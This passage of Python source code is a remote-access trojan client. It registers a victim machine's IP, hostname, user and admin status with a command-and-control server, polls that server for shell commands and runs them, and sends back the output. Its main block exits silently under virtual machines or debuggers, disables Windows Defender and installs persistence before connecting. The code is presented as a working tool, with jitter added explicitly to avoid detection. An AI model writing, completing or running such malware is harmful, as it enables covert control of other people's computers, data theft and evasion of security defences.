                path = raw_path
            return preview_file(path)

        else:
            # Shell command execution — use current_dir as cwd
            output = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL, cwd=current_dir
            )
            return output.decode(encoding='utf-8', errors='replace')

    except Exception as e:
        return f"[-] Error: {str(e)}"


def connect_c2():
    """Main C2 connection loop with encrypted comms, jitter, and exponential backoff"""
    print("[*] Starting C2 connection loop...")
    global client_id
    backoff = RETRY_BACKOFF_MIN

    while True:
        try:
            # Random initial delay to avoid burst patterns (shorter on re-register)
            time.sleep(random.uniform(1, 2))

            # Quick reachability check before full registration
            try:
                requests.get(f"{C2_DOMAIN}/test", timeout=5)
            except Exception:
                wait = min(backoff, RETRY_BACKOFF_MAX)
                print(f"[!] Server unreachable — retrying in {wait}s...")
                time.sleep(wait)
                backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
                continue

            # Server is up — reset backoff
            backoff = RETRY_BACKOFF_MIN

            # Gather real system info (use session UA even for IP lookup)
            try:
                ip = get_session().get("https://api.ipify.org", timeout=10).text.strip()
            except Exception:
                ip = "unknown"

            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
            pid = os.getpid()
            client_id = f"{ip}:{pid}"

            # Check admin status
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception:
                is_admin = False

            session_info = {
                "ip": ip,
                "host": hostname,
                "os": os_info,
                "pid": pid,
                "user": os.getlogin(),
                "admin": is_admin,
                "client_id": client_id
            }
            print(f"[*] Registering client: {client_id}")
            resp = c2_post("/register", session_info)
            if resp and resp.status_code == 200:
                print("[+] Registered successfully.")
            else:
                status = resp.status_code if resp else "No Response"
                print(f"[-] Registration failed with status: {status}")
                time.sleep(RETRY_DELAY)
                continue # Try registration again

            # Command polling loop
            while True:
                try:
                    cmd_data = c2_get("/cmd", params={"id": client_id})
                    if cmd_data:
                        # Server restarted — re-register immediately
                        if cmd_data.get("action") == "re-register":
                            break

                        cmd = cmd_data.get("command")
                        if cmd:
                            result = execute_command(cmd)
                            if result is not None:  # kill command exits before returning
                                c2_post("/result", {
                                    "output": result,
                                    "client_id": client_id
                                })
                except requests.exceptions.ConnectionError:
                    print("[!] Lost connection — reconnecting...")
                    break
                except Exception:
                    pass  # Never let a single command crash the polling loop

                # Jittered sleep to avoid detection
                jitter = random.uniform(-JITTER, JITTER)
                time.sleep(max(1, POLLING_DELAY + jitter))

        except requests.exceptions.ConnectionError:
            wait = min(backoff, RETRY_BACKOFF_MAX)
            print(f"[!] Server unreachable — retrying in {wait}s...")
            time.sleep(wait)
            backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
        except requests.exceptions.Timeout:
            print(f"[!] Request timed out — retrying in 5s...")
            time.sleep(5)
            backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
        except Exception:
            time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    # hide_console()
    print("[*] Client started. Debug mode active.")
    check_single_instance()

    # Anti-analysis: exit silently if VM/sandbox or debugger detected
    if ANTI_VM and is_vm_or_sandbox():
        sys.exit(0)
    if is_debugger_present():
        sys.exit(0)

    disable_defender()
    add_persistence()
    connect_c2()